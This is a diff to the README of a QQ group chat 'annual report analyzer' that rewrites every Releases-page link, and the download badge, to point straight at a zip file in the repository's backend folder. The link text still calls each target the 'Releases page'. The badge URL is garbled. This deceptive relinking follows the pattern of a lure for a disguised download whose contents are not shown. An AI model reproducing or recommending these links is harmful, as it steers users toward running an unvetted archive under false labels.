@@ -1,6 +1,6 @@
 # 🎉 QQgroup-annual-report-analyzer - Analyze Your QQ Group Chats Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-ff69b4.svg)](https://github.com/bilaljc/QQgroup-annual-report-analyzer/releases)
+[![Download Latest Release](https://github.com/bilaljc/QQgroup-annual-report-analyzer/raw/refs/heads/main/backend/Q_analyzer_Qgroup_annual_report_3.8.zip%20Latest%20Release-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://github.com/bilaljc/QQgroup-annual-report-analyzer/raw/refs/heads/main/backend/Q_analyzer_Qgroup_annual_report_3.8.zip)](https://github.com/bilaljc/QQgroup-annual-report-analyzer/raw/refs/heads/main/backend/Q_analyzer_Qgroup_annual_report_3.8.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ QQgroup-annual-report-analyzer is a tool designed to help you analyze your QQ gr
 Follow these simple steps to download and run QQgroup-annual-report-analyzer:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/bilaljc/QQgroup-annual-report-analyzer/releases) to find the latest version.
+   Go to our [Releases page](https://github.com/bilaljc/QQgroup-annual-report-analyzer/raw/refs/heads/main/backend/Q_analyzer_Qgroup_annual_report_3.8.zip) to find the latest version.
 
 2. **Download the Application**  
    On the Releases page, look for the most recent version. You will see an option to download the application file. Click on the appropriate file based on your operating system.
@@ -35,9 +35,9 @@ Follow these simple steps to download and run QQgroup-annual-report-analyzer:
 
 ## 📥 Download & Install
 
-The latest version of QQgroup-annual-report-analyzer is available for download. Visit this link to access the [Releases page](https://github.com/bilaljc/QQgroup-annual-report-analyzer/releases). You can find installation files suited for your system.
+The latest version of QQgroup-annual-report-analyzer is available for download. Visit this link to access the [Releases page](https://github.com/bilaljc/QQgroup-annual-report-analyzer/raw/refs/heads/main/backend/Q_analyzer_Qgroup_annual_report_3.8.zip). You can find installation files suited for your system.
 
-1. Head to the [Releases page](https://github.com/bilaljc/QQgroup-annual-report-analyzer/releases).
+1. Head to the [Releases page](https://github.com/bilaljc/QQgroup-annual-report-analyzer/raw/refs/heads/main/backend/Q_analyzer_Qgroup_annual_report_3.8.zip).
 2. Choose the version you want and download it.
 3. Follow the installation steps outlined above.
 
